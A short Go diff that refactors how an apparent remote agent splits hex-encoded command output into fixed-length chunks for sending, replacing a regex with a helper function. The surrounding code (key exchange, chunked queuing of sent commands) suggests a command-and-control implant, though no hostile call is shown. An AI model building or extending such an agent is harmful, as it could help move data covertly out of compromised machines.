@@ -13,7 +13,6 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
-	"regexp"
 	"sort"
 	"strings"
 
@@ -171,8 +170,7 @@ func (a *Agent) Keyx() {
 func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 	data := BytesToHexString(bytes)
 
-	chunkSplitRegex := fmt.Sprintf("[a-f0-9]{1,%d}", SENDQ_CHUNK_LEN)
-	chunks := regexp.MustCompile(chunkSplitRegex).FindAllString(data, -1)
+	chunks := chunkString(data, SENDQ_CHUNK_LEN)
 	totalChunks := len(chunks)
 
 	// unique-ish identifier for each sent command to aide in reconstruction
